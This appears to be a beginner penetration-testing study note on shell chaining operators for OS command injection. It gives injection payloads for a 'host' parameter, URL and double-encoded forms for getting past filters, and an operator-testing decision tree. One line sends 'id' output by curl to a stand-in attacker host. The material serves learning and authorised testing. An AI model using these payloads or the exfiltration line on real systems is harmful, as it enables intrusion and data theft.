---
tags: [vapt, command-injection, beginner, reference]
difficulty: beginner
module: "08 - Command Injection"
topic: "08.08 Chaining Operators"
---

# 08.08 — Chaining Operators

## Complete Operator Reference

```
OPERATOR  SHELL     BEHAVIOR
--------  -----     --------
;         bash      Run cmd2 regardless of cmd1 result
|         both      Pipe cmd1 stdout to cmd2 stdin
||        both      Run cmd2 ONLY if cmd1 FAILS (non-zero exit)
&         bash      Run cmd1 in background, then cmd2
&&        both      Run cmd2 ONLY if cmd1 SUCCEEDS (exit 0)
`cmd`     bash      Execute cmd, substitute output (backtick)
$(cmd)    bash      Execute cmd, substitute output (modern)
\n        bash      Newline = new command
%0a       URL       URL-encoded newline
```

---

## Detailed Examples

### Semicolon `;`

```bash
# RUNS BOTH COMMANDS — FIRST MUST SUCCEED OR FAIL, DOESN'T MATTER:
command1; command2

# EXAMPLE:
ping -c 1 8.8.8.8; id
→ Runs ping, THEN runs id regardless of ping result!

# INJECTION CONTEXT:
?host=8.8.8.8;id
?host=8.8.8.8; id     ← space is optional
?host=8.8.8.8;id;     ← trailing semicolon fine
?host=;id             ← empty first command! just runs id
```

### Pipe `|`

```bash
# PIPES STDOUT OF cmd1 TO STDIN OF cmd2:
command1 | command2

# EXAMPLE:
ls /etc | grep passwd
→ Lists /etc, pipes to grep, shows matching lines

# INJECTION:
ping -c 1 8.8.8.8 | id
→ ping output goes to id's stdin
→ id ignores stdin → still runs → outputs uid!

# USEFUL WHEN:
# ;  is filtered but | is not
```

### Double Pipe `||` (OR)

```bash
# RUNS cmd2 ONLY IF cmd1 FAILS:
command1 || command2

# EXAMPLE:
invalidcommand123 || id
→ invalidcommand123 fails → id runs!

# INJECTION WITH INVALID FIRST COMMAND:
?host=invalid_nonexistent_host||id
→ ping fails (invalid host) → id runs!

# USEFUL WHEN:
# First command always fails (like pinging invalid host)
# Or: inject value that makes first command error
# ?host=a||id  (pinging "a" fails → id runs)
```

### Ampersand `&` (Background)

```bash
# RUNS cmd1 IN BACKGROUND AND cmd2:
command1 & command2

# cmd2 may run before cmd1 finishes!

# EXAMPLE:
sleep 30 & id
→ sleep starts in background → id runs immediately

# INJECTION:
?host=8.8.8.8&id
→ ping runs in background → id runs! → id output may appear first

# NOTE: Windows uses & for sequential execution (not background!)
# In Windows cmd.exe: & = same as ; in Linux
```

### Double Ampersand `&&` (AND)

```bash
# RUNS cmd2 ONLY IF cmd1 SUCCEEDS:
command1 && command2

# EXAMPLE:
ping -c 1 8.8.8.8 && id
→ ping succeeds → id runs!

invalidhost && id
→ ping fails → id does NOT run!

# INJECTION:
?host=8.8.8.8&&id        ← ping succeeds → id runs
?host=127.0.0.1&&id      ← localhost ping succeeds → id runs
?host=invalid&&id         ← ping fails → id does NOT run!
```

### Backtick `` ` ` `` (Command Substitution)

```bash
# EXECUTES cmd AND SUBSTITUTES OUTPUT INTO THE COMMAND:
echo `id`
→ Runs id, takes output, passes to echo
→ Output: uid=33(www-data) gid=33(www-data)

# INJECTION:
?host=`id`
→ ping -c 1 `id`
→ Runs id → substitutes uid=33(www-data)... as the hostname → ping gets invalid host
→ But id DID run!

# MORE USEFUL — IN STRING CONTEXT:
;curl https://attacker.com/`id`
→ Makes request to: https://attacker.com/uid=33(www-data)...
→ DNS lookup / request = data exfiltration!
```

### Dollar-Paren `$()` (Modern Command Substitution)

```bash
# SAME AS BACKTICK BUT NESTABLE:
echo $(id)
echo $(echo $(id))   ← nested!

# INJECTION:
?host=$(id)
?host=8.8.8.8$(id)

# ADVANTAGES OVER BACKTICKS:
# - Can be nested: $(whoami && id)
# - Clearer syntax
# - Works the same in bash
```

### Newline `\n` / `%0a`

```bash
# SHELL TREATS NEWLINES AS COMMAND SEPARATORS:
echo hello
id

# INJECTION:
?host=127.0.0.1%0aid     ← %0a = newline
?host=127.0.0.1\nid       ← literal \n (may or may not be interpreted)

# USEFUL WHEN:
# ; | & etc. are all filtered
# %0a (newline) may be missed by filters!

# ALSO:
%0d%0a = \r\n (CRLF — Windows line ending)
```

---

## Operator Priority in Shells

```
EXECUTION ORDER:
  Parentheses: ()  → highest priority
  Subshell:  $()  and `` 
  Pipes:      |
  AND/OR:    && and ||
  Background: &
  Semicolon:  ;    → lowest priority

EXAMPLE:
  cmd1 || cmd2 && cmd3
  
  If cmd1 FAILS:
    cmd1 fails → cmd2 runs
    If cmd2 SUCCEEDS → cmd3 runs
    
  If cmd1 SUCCEEDS:
    cmd1 succeeds → cmd2 does NOT run (|| says: run only on failure)
    cmd3 runs only if previous && was satisfied
```

---

## URL Encoding Reference

```
CHARACTER   URL ENCODED     DOUBLE ENCODED
---------   -----------     --------------
;           %3B             %253B
|           %7C             %257C
&           %26             %2526
&&          %26%26          %2526%2526
||          %7C%7C          %257C%257C
\n          %0A             %250A
\r          %0D             %250D
\r\n        %0D%0A          %250D%250A
space       %20 or +        %2520
`           %60             %2560
$           %24             %2524
(           %28             %2528
)           %29             %2529
>           %3E             %253E
<           %3C             %253C
```

---

## Quick Decision Tree

```
WHICH OPERATOR TO USE?

?host=VALUE → test each:
  1. ;id       → Semicolon (most common Linux)
  2. |id       → Pipe (good fallback)
  3. ||id      → OR (when you can force first cmd to fail)
  4. &&id      → AND (when first cmd succeeds)
  5. &id       → Background (ampersand)
  6. %0aid     → Newline (when others filtered)
  7. $(id)     → Subshell substitution
  8. `id`      → Backtick substitution
  
WINDOWS EXTRA:
  9. & whoami   → Windows sequential
  10. %26whoami → URL-encoded &
```

---

## Related Notes
- [[02 - OS Command Injection Linux]] — Linux injection
- [[03 - OS Command Injection Windows]] — Windows cmd operators
- [[09 - WAF Bypass for Command Injection]] — encoding bypasses
- [[04 - Blind Command Injection]] — blind detection
